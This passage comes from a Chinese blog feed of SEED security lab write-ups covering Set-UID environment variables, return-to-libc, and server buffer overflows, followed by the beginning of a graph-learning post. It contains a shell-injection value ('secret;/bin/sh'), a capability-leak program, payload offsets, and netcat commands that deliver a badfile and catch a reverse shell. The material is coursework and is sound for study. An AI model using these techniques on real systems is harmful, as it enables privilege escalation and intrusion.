user.</li></ul><p>此时myprog的实际用户是seed，而有效用户也是seed，所以此时会发生重载，并且运行myprog的shell程序会是继承父shell程序的environment variable</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/30.PNG" srcset="/img/loading.gif" alt="30"></p><ul><li>针对Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</li></ul><p>此时myprog的实际用户是seed，而有效用户是root，所以会忽略LD_PRELOAD（实际上执行myprog的shell进程就没有继承来自父shell的LD_PRELOAD的环境变量）</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/31.PNG" srcset="/img/loading.gif" alt="31"></p><p>后面两个实际上是同理的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/32.PNG" srcset="/img/loading.gif" alt="32"></p><h3 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h3><p>这个task的target是看system()和execve()之间的区别以及调用shell的另一个危险之处？还与环境变量无关？</p><h4 id="step-1-4"><a href="#step-1-4" class="headerlink" title="step 1"></a>step 1</h4><p>在这一步当中，我们就把seed当作是Bob，所以需要做的就是运行catall文件来进行删除不属于我们权限的文件</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/33.PNG" srcset="/img/loading.gif" alt="33"></p><p>发现这个文件是没有了的，而secret这个文件有效用户为root，其他的用户权限仅为r；我们将这个文件删除了，说明在catall这个set-uid程序当中，我们以root权限执行来rm的操作，同理，我们也可以通过这个方法来获取shell权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/34.PNG" srcset="/img/loading.gif" alt="34"></p><h4 id="step-2-4"><a href="#step-2-4" class="headerlink" title="step 2"></a>step 2</h4><p>当我们把上面的system()函数换成execve()函数的时候，会发现</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/35.png" srcset="/img/loading.gif" alt="35"></p><p>此时无法执行多条命令，无法删除secret文件同时也不能获得root权限</p><h4 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h4><p>首先是从system()函数上来看</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/36.PNG" srcset="/img/loading.gif" alt="36"></p><blockquote><p>总结来看，调用system()的话首先运行fork,产生一个子进程,然后使用execl函数进行运行命令/bin/sh,产生一个shell程序,运行command命令,同时,将环境变量显式传递给新程序.同时在父进程中调用wait去等待子进程结束.</p><p>环境变量经过了三个阶段:</p><ol><li>进程本身拥有</li><li>fork时复制给子进程</li><li>execl函数运行时,显式赋值给新程序</li></ol></blockquote><p>在第二步中,引入了外部程序shell,而在shell中,是可以执行任何指令的,所以,我们可以执行多条指令,在设置setuid程序后,可以获取root权限.<br>而execve函数为执行一个系统调用函数</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],<span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;</code></pre><p>第二个参数中如果包含额外的指令,他们仍然会被视为一个参数,并非一个指令.所以才会出现:</p><blockquote><p>/bin/cat: ‘secret;/bin/sh’: No such file or directory</p></blockquote><p>的错误,secret;/bin/sh被视为了一个字符串参数.<br>system()函数违背了最小权限原则,调用了shell,而shell可以执行任意命令.以及输入验证原则,过分信任了用户的输入.所以,system()函数需要谨慎使用,推荐使用execve()函数,进行了运行程序与程序参数的分类,更安全.</p><h3 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h3><p>首先来看setuid()函数作用</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/37.PNG" srcset="/img/loading.gif" alt="37"></p><blockquote><ul><li><p>进程有root权限</p><p>  当有效用户id为root,而真实用户ID和保留用户ID为普通用户,即Set-UID进程,时,会设置有效用户ID,真实用户ID,保留用户ID为参数uid,包括设置为0,即可以通过在Set-UID程序中使用:setuid(geteuid());代码,使进程的真实用户ID,保留用户ID均为0.</p></li><li><p>进程不具有 root 权限</p><p>  若进程不具有 root 权限，那么普通用户使用 setuid() 时参数 uid 只能是自己的，没有权限设置别的数值，否则返回失败.</p></li></ul></blockquote><p>有疑问的地方在于运行setuid()函数之后不应该就没有特权了吗？</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/38.PNG" srcset="/img/loading.gif" alt="38"></p><p>修改cap_leap.c文件</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> fd;  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><span class="hljs-comment">   * Before running this program, you should create</span><span class="hljs-comment">   * the file /etc/zzz first. */</span>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/seed/Desktop/lab3/Labsetup/zzz"</span>, O_RDWR | O_APPEND);          <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cannot open /home/seed/Desktop/lab3/Labsetup/zzz\n"</span>);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-comment">// Print out the file descriptor value</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fd is %d\n"</span>, fd);  sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Permanently disable the privilege by making the</span>  <span class="hljs-comment">// effective uid the same as the real uid</span>  setuid(getuid());                                  <span class="hljs-keyword">if</span> (fork())&#123; <span class="hljs-comment">/* In the parent process */</span>     <span class="hljs-built_in">close</span> (fd);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;<span class="hljs-keyword">else</span>   &#123;     <span class="hljs-built_in">write</span> (fd, <span class="hljs-string">"Malicious Data\n"</span>, <span class="hljs-number">15</span>);     <span class="hljs-built_in">close</span> (fd);   &#125;  <span class="hljs-comment">// Execute /bin/sh</span>  <span class="hljs-comment">// v[0] = "/bin/sh"; v[1] = 0;</span>  <span class="hljs-comment">// execve(v[0], v, 0);                             </span>&#125;</code></pre><p>之后运行可以发现已经进行了写入</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/39.PNG" srcset="/img/loading.gif" alt="39"></p><blockquote><p>这是因为,在子进程中,文件描述符fd在进入close()函数前仍然有效,此时虽然进行了setuid(getuid());进行进程的特权解除,随后的非特权进程仍然可以进行修改文件.所以应该在降低特权前运行close(fd),销毁文件描述符.</p></blockquote><h3 id="附加题"><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h3><h4 id="编译challenge-c"><a href="#编译challenge-c" class="headerlink" title="编译challenge.c"></a>编译challenge.c</h4><p>gcc challenge.c -o challenge</p><h4 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h4><p>challenge.c 会读取环境变量”PWD”(当前路径,如”/home/seed/env_lab”), 然后将其中的值传给buffer. 由于程序使用了危险的函数”strcpy”, 因此如果”PWD”的长度过长，会在栈上造成溢出. 本题需要大家通过栈溢出将buffer上面的数组overflowIt的一个位置的值修改成0x01020304.<br>如果攻击成功，程序会输出”Congratulations, you pwned it!”.</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><ol><li>需要创建新的文件夹, 可能需要GDB调试.</li><li>如果下课前半小时没有完成，可以找助教要一个方便调试的pwn脚本.</li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-Tasks&quot;&gt;&lt;a href=&quot;#Lab-Tasks&quot; class=&quot;headerlink&quot; title=&quot;Lab Tasks&quot;&gt;&lt;/a&gt;Lab Tasks&lt;/h2&gt;&lt;h3 id=&quot;task-1：manipulate-environment-variabl</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Return to libc attack</title>
    <link href="http://yoursite.com/2021/03/24/Return-to-libc-attack/"/>
    <id>http://yoursite.com/2021/03/24/Return-to-libc-attack/</id>
    <published>2021-03-24T11:12:07.000Z</published>
    <updated>2021-03-31T11:52:53.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>return to libc是属于缓冲区溢出的一种攻击</p><ul><li><p>前提：此时堆栈不可执行，所以不能够将恶意代码注入到堆栈当中来进行执行</p></li><li><p>方案：将返回地址修改为现有的代码，例如<code>libc</code>库里面的<code>system()</code>函数，该函数已经加载到内存空间</p></li></ul><h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h2><p>既然说我们需要调用<code>system()</code>函数来帮助我们获得root shell，那么首先我们就需要来获得<code>system()</code>函数的位置，通过运行gdb来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>以及通过batch模式下来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以看到system()函数的地址是0xf7e12420，exit()函数的地址是0xf7e04f80</p><h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><p>这一步其实就是传参，将/bin/sh放入内存，需要的时候进行</p><p>方法：</p><p>将<code>/bin/sh</code>通过环境变量的方式来放入到内存当中，参考blog：<a href="https://blog.csdn.net/lsx2017/article/details/86104543?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676442516780274128887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161676442516780274128887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-86104543.pc_search_result_no_baidu_js&utm_term=%E5%AF%BC%E5%87%BAshell%E5%8F%98%E9%87%8F%E5%92%8C%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" target="_blank" rel="noopener">shell总结1：Shell全局变量、局部变量和环境变量</a>，之后的子shell中已经将该环境变量加入到内存当中了，通过运行prtenv和retlib来进行验证</p><p><img src="/2021/03/24/Return-to-libc-attack/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到此时/bin/sh作为环境变量在内存当中的地址是0xffffd40f</p><h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p>在这一步当中，我们构造badfile的payload，根据注释以及前面的信息，可以得知我们现在已经获取了所要调用的函数的地址以及参数在地址当中的位置，那么现在对于我们来说就需要知道将这些信息放在payload的什么位置/在栈中的位置</p><ul><li>首先我们的目标是调用<code>system()</code>函数，那么就需要修改bof函数的return address为<code>system()</code>的起始位置<code>0xf7e12420</code>，此时我们需要将它填到A+0x4当中</li><li>之后我们要确定<code>/bin/sh</code>所要放到的位置，通过分析执行完bof()函数之后调用<code>system()</code>函数时栈的地址，会发现此时参数/bin/sh应该放在ebp + 0xc的位置上</li><li>之后为了在/bin/sh运行之后正常退出，所以我们需要在调用完system()函数之后调用exit()函数，将system()的返回地址填充为exit()的地址</li></ul><p><img src="/2021/03/24/Return-to-libc-attack/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>可以看到buffer的起始位置和ebp之间的距离，即A和B之间的距离为0x18，所以system()相对于buffer的偏移量就是0x18 + 0x4 = 0x1c，而exit的偏移量就在0x18 + 0x8 = 0x20，/bin/sh所在位置就是0x18 + 0xc = 0x24（）</p><p><strong>因为在执行完bof函数之后，最后肯定是pop出来system()的地址并且进行跳转，此时esp所执行想的就应该是原来的ebp + 8的位置，而当我们执行system()函数的时候，第一步就是push ebp，所以相比之前的ebp，会往上移4位，然后ebp需要在return address之下，而return address需要在传入参数的下面，所以位置分别为0x18 + 0x4,0x18 + 0x8,0x18+0xc，需要深入并细致的分析汇编以及寄存器内容</strong></p><p><img src="/2021/03/24/Return-to-libc-attack/8.PNG" srcset="/img/loading.gif" alt="8"></p><p><img src="/2021/03/24/Return-to-libc-attack/5.PNG" srcset="/img/loading.gif" alt="5"></p><h3 id="Attack-variation-1"><a href="#Attack-variation-1" class="headerlink" title="Attack variation 1"></a>Attack variation 1</h3><p>在badfile中去除exit函数，在这里我们修改跳转地址就好，改为0xAAAAAAAA</p><p><img src="/2021/03/24/Return-to-libc-attack/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>之后在进行运行，会发现仍能够获取权限，但是当我们执行exit来退出的时候，会由于跳转地址而发生segmentation fault</p><h3 id="Attack-variation-2"><a href="#Attack-variation-2" class="headerlink" title="Attack variation 2"></a>Attack variation 2</h3><p>其实原理就是当我们改变名称的时候，会改变环境变量的地址，就只是会打印出消息，而不会获取root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/9.PNG" srcset="/img/loading.gif" alt="9"></p><h2 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h2><p>这个task就是在针对于shell的解决方案，因为最开始的时候我们是将/bin/sh连接到了/bin/zsh，而不是<code>/bin/dash</code>，这是由于dash和bash会自动放弃特权，但是如果说我们增加一个选项 -p，那么命令就会变为<code>/bin/bash -p</code>，这就不会自动放弃特权，而根据提示，<code>execv()</code>可以帮助我们来执行这条命令</p><p>下面开始一步一步拆解解决问题</p><ol><li><p>首先是要获取<code>execv()</code>函数以及<code>exit()</code>函数在内存当中的地址</p><p> <img src="/2021/03/24/Return-to-libc-attack/10.PNG" srcset="/img/loading.gif" alt="10"></p><p> 所以<code>execv()</code>和<code>exit()</code>分别位于0xf7e994b0, 0xf7e04f80</p></li><li><p>把/bin/bash和-p设置为环境变量并且找到他们在内存当中的位置</p><p> <img src="/2021/03/24/Return-to-libc-attack/11.PNG" srcset="/img/loading.gif" alt="11"></p><p> 之后打印出相应的地址信息</p><p> <img src="/2021/03/24/Return-to-libc-attack/12.PNG" srcset="/img/loading.gif" alt="12"></p><p> <img src="/2021/03/24/Return-to-libc-attack/13.PNG" srcset="/img/loading.gif" alt="13"></p><p> 可以看到/bin/bash的地址是<code>0xffffd401</code>，-p的地址是<code>0xffffd515</code></p></li><li><p>之后就是分析栈上面的内容，ipad上面有，可以分析出<code>execv()</code>要放在距离buffer首地址偏移量位0x1c的地方，<code>exit()</code>要放在距离buffer首地址0x20的地方，而pastname放在0x24，argv[]数组就放在了从0x28开始的位置上，并且根据打印出来的信息，我们能够得到input[]的其实位置以及相对偏移量</p><p> <img src="/2021/03/24/Return-to-libc-attack/14.PNG" srcset="/img/loading.gif" alt="14"></p><p> 之后就是根据信息来构造payload</p></li></ol><p><img src="/2021/03/24/Return-to-libc-attack/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后进行运行，成功获得root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h2><p>本来我们是要在调用system函数之前调用setuid(0)，而实际上需要在bof结束之后调用10次foo，然后再调用execv()</p><p>首先，我们需要获得foo、execv以及exit在内存当中的位置分别为<code>0x565562b0,0xf7e994b0,0xf7e04f80</code></p><p><img src="/2021/03/24/Return-to-libc-attack/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>之后结合栈里面信息进行修改</p><p><img src="/2021/03/24/Return-to-libc-attack/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;return to libc是属于缓冲区溢出的一种攻击&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;前提</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Buffer Overflow Attack server</title>
    <link href="http://yoursite.com/2021/03/16/Buffer-Overflow-Attack-server/"/>
    <id>http://yoursite.com/2021/03/16/Buffer-Overflow-Attack-server/</id>
    <published>2021-03-16T12:55:50.000Z</published>
    <updated>2021-03-17T19:01:27.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-Attack-Server-Version"><a href="#Buffer-Overflow-Attack-Server-Version" class="headerlink" title="Buffer Overflow Attack(Server Version)"></a>Buffer Overflow Attack(Server Version)</h1><h2 id="task-1：Get-familiar-with-the-shellcode"><a href="#task-1：Get-familiar-with-the-shellcode" class="headerlink" title="task 1：Get familiar with the shellcode"></a>task 1：Get familiar with the shellcode</h2><p>就是按照步骤来实现shell命令的修改，为了测试，在shellcode文件夹下面创建了temp文件</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>首先是在<code>shellcode_32.py</code>文件当中，将原来的line 2的命令修改为<code>&quot;rm /home/seed/Desktop/lab1/Labsetup/shellcode/temp        *&quot;</code>，之后运行py文件并且编译call_shellcode.c文件，运行后可以看到temp文件被删除</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/2.PNG" srcset="/img/loading.gif" alt="2"></p><p><strong>64位的和32位的命令是一样的，下面只展示成功时候的截图</strong></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="task-2：Level-1-Attack"><a href="#task-2：Level-1-Attack" class="headerlink" title="task 2：Level 1 Attack"></a>task 2：Level 1 Attack</h2><p>此时相当于是已经建立好了attacker和server之间的连接，当执行下面命令后</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>会在server端出现</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>之后，我们要通过构造<code>badfile</code>文件，让badfile来覆盖掉返回地址，使得之后返回的地址是shellcode在栈上的位置，或者指向shellcode前面的nop指令。</p><p><strong>思路：</strong>进行代码分析，首先来看<code>stack.c</code>，也就是<code>buffer overflow vulnerability</code>的代码，它的基本思路是这样的：首先，<code>main()</code>函数会开一个517个byte的局部变量<code>str[]</code>，用来存储我们所需要写入的字节，之后将str的首字节压入栈中，作为<code>dummy_function()</code>的参数，而<code>dummy_function()</code>最主要的作用就是将str首地址并调用了bof()函数，该函数的作用是开一个<code>buffer[]</code>，并且将<code>str</code>里面的内容写入到<code>buffer</code>里面。而<code>exploit.py</code>的文件内容实际上就是构造<code>badfile</code>里面的内容（将<code>content</code>写入到<code>badfile</code>），而<code>badfile</code>就是输入的东西，写入到str，之后就是<code>strcpy</code>到<code>buffer</code>并且覆盖<code>return address</code></p><p>我们已经知道了ebp的地址是<code>0xffffd318</code>，而返回地址的起始地址就是ebp + 4，就是<code>0xffffd31c</code>，距离buffer首地址0x74，就是116个byte，而shellcode随便放在返回地址上面，这里放在<code>ebp + 12</code>处，也就是0xffffd324，距离buffer首地址0x7c</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/6.PNG" srcset="/img/loading.gif" alt="6">)<img src="/2021/03/16/Buffer-Overflow-Attack-server/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>之后在主机上开一个监听端口，<code>nc -nv -l 9090</code>，然后运行exploit.py文件<code>./exploit.py</code>以及<code>cat badfile | nc 10.9.0.5 9090</code></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>reverse shell成功</p><h2 id="task-3：Level-2-Attack"><a href="#task-3：Level-2-Attack" class="headerlink" title="task 3：Level-2 Attack"></a>task 3：Level-2 Attack</h2><p>在这个task里面，给我们的hint会变少，运行echo hello，会发现只给了Buffer的起始位置是0xffffd258，我们不知道buffer具体的大小，但是可以得知范围是在[100，300]之间，同时需要之构造一个就能够解决这个范围内所有的变化</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/9.PNG" srcset="/img/loading.gif" alt="9"></p><ul><li>针对于buffer的范围，我们选择直接将300byte来作为buffer的区域，同时，shellcode的起始位置也是可以找到的，<strong>我们选择将从buffer首地址开始到300+8都填充为我们shellcode的起始位置</strong>，偏移量308 = 0x134</li><li>针对于如何设置返回地址/shellcode的起始位置，返回地址要指向偏移量308以及之后的位置，在这里设置为了312 = 0x138，所以返回的地址就是0xffffd258 + 0x138 = 0xffffd390</li></ul><p>shellcode无需修改，仍然是这个命令，修改后的部分code如下</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>之后按照上面的命令顺序在运行一遍，能够reverse shell，成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/11.PNG" srcset="/img/loading.gif" alt="11"></p><h2 id="task-4：-Level-3-Attack"><a href="#task-4：-Level-3-Attack" class="headerlink" title="task 4： Level-3 Attack"></a>task 4： Level-3 Attack</h2><p>在这个task里面，我们的目标服务器运行的是64位的程序，首先先echo hello来看一下打印出来的信息</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>可以看到我们能够知道buffer的起始地址以及rbp的地址，同时问题是不能出现1byte的0，否则strcpy函数就会停止复制，解决方法是既然要跳转的shellcode一定会是含有0x00，那么就直接把shellcode放在buffer里面，这样在最后strcpy的时候，会将要跳转的位置进行修改后才停止（要注意buffer的大小），在这里buffer的大小位0xd0 = 208bytes，而shellcode在这里是能够放下的</p><p>把shellcode放在buffer起始位置，然后返回地址的偏移量是0xd0 + 8 = 0xd8</p><p>之后将相应的code进行修改</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/13.PNG" srcset="/img/loading.gif" alt="13"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/14.PNG" srcset="/img/loading.gif" alt="14"></p><p>然后再按照之前命令进行运行，reverse shell成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="task-5：Level-4-Attack"><a href="#task-5：Level-4-Attack" class="headerlink" title="task 5：Level-4 Attack"></a>task 5：Level-4 Attack</h2><p>思路：在这里，buffer是空间较小的，不足以放下我们的shellcode，但是需要注意的是，每次都是先将badfile作为输入写入到main里面的str的位置，然后才会去strcpy到我们的buffer里来进行覆盖返回地址，所以在这里的解决方法就是将shellcode写入到str里面，但是不strcpy到下面，而是将返回地址修改位shellcode在str里面的地址</p><p>首先，还是先echo hello</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>我们能够知道rbp的地址是0x00007fffffffe1a0，而buffer的首地址是0x00007fffffffe140，此时相距0x60 = 96bytes</p><p>之后需要用到gdb来调试，在这里需要修改makefile，并且重新编译并且启动容器</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>分别运行<code>gdb stack-L4，b main，r，p /x &amp;str</code>命令来获取str的地址</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>之后我们需要找到rbp的位置来确定相对偏移量，将断点设在bof函数，然后查看rbp寄存器的值就好</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>所以，str和rbp之间的相对的偏移量是0x430</p><p>之后结合运行时候rbp的地址是0x00007fffffffe1a0，可以计算出str的地址是0x00007fffffffe5d0，同时将shellcode存放在相对str起始位置256偏移量的地方，所以shellcode的地址就是0x00007fffffffe6d0，而return address相对于buffer的偏移量是0x68</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>成功！</p><h2 id="task-6：Experimenting-with-the-Address-Randomization"><a href="#task-6：Experimenting-with-the-Address-Randomization" class="headerlink" title="task 6：Experimenting with the Address Randomization"></a>task 6：Experimenting with the Address Randomization</h2><p>打开栈地址随机化并且发送echo hello命令</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/23.PNG" srcset="/img/loading.gif" alt="23"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/24.PNG" srcset="/img/loading.gif" alt="24"></p><p>可以看到每次栈的栈帧指针和buffer起始位置都变化了，但是buffer分配的缓冲区大小不变。</p><p>采用暴力破解来击败随机化策略：原理是任意猜一组当前栈帧指针位置和buffer首地址，只要保证buffer size为0x70即可，然后不停给server发送badfile，由于server栈地址一直在变化，总有一次可以正好变成你猜的这组地址，然后就能获取reverse shell了。</p><p>好吧，是我脸黑</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/25.PNG" srcset="/img/loading.gif" alt="25"></p><h2 id="task-7：Experimenting-with-Other-Countermeasures"><a href="#task-7：Experimenting-with-Other-Countermeasures" class="headerlink" title="task 7：Experimenting with Other Countermeasures"></a>task 7：Experimenting with Other Countermeasures</h2><p>在makefile中把 -fno-stack-protector注释掉。然后make，并且单独运行stack-L1</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>可以看到stack smashing detected，保护机制丢弃了这个输入</p><p>下面是使得堆栈不可执行，修改makefile文件，并重新编译运行</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/27.PNG" srcset="/img/loading.gif" alt="27"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>完成！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Buffer-Overflow-Attack-Server-Version&quot;&gt;&lt;a href=&quot;#Buffer-Overflow-Attack-Server-Version&quot; class=&quot;headerlink&quot; title=&quot;Buffer Overflow At</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Graph Representation learning</title>
    <link href="http://yoursite.com/2021/03/03/Graph-Representation-learning/"/>
    <id>http://yoursite.com/2021/03/03/Graph-Representation-learning/</id>
    <published>2021-03-03T08:23:34.000Z</published>
    <updated>2021-03-17T08:56:50.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2-Background-amp-Traditional-approaches"><a href="#2-Background-amp-Traditional-approaches" class="headerlink" title="2.Background &amp; Traditional approaches"></a>2.Background &amp; Traditional approaches</h2><h3 id="2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法"><a href="#2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法" class="headerlink" title="2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)"></a>2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)</h3><p>邻接矩阵可以无信息损失的表示图，而具有同样的一些效果的矩阵被称为拉普拉斯矩阵，这些矩阵是由邻接矩阵通过变换得到的</p><h4 id="2-3-1-Graph-Laplacians"><a href="#2-3-1-Graph-Laplacians" class="headerlink" title="2.3.1 Graph Laplacians"></a>2.3.1 Graph Laplacians</h4><ul><li><strong>Unnormalized Laplacian非规范化的拉普拉斯式</strong></li></ul><p><img src="/2021/03/03/Graph-Representation-learning/2.3-1.PNG" srcset="/img/loading.gif" alt="2.3-1"></p><h4 id="2-3-2-Graph-Cuts-and-clustering"><a href="#2-3-2-Graph-Cuts-and-clustering" class="headerlink" title="2.3.2 Graph Cuts and clustering"></a>2.3.2 Graph Cuts and clustering</h4><p>在这一节当中会介绍使用拉普拉斯矩阵，在完全连通图中给出节点的最优聚类（optimal cluster）。</p><p><strong>Graph cuts</strong></p><p>首先，我们先需要找的用来衡量分割好坏的量，称之为<code>cut value</code>，而其值的定义如下：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-2.PNG" srcset="/img/loading.gif" alt="2.3-2"></p><p>换句话说，就是<strong>有的多少条边越过了我们所划分的不同子集的边界</strong>，而所谓的最优聚类就算是找到cut value最小的划分方式</p><p><strong>缺点：倾向于把图划分成独立的点（稍微有一些不理解！！！）</strong></p><p>改进方法：不仅仅是寻找最小化切割的方式，并且要使得分区是较大的，引入<code>ratio cut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-3.PNG" 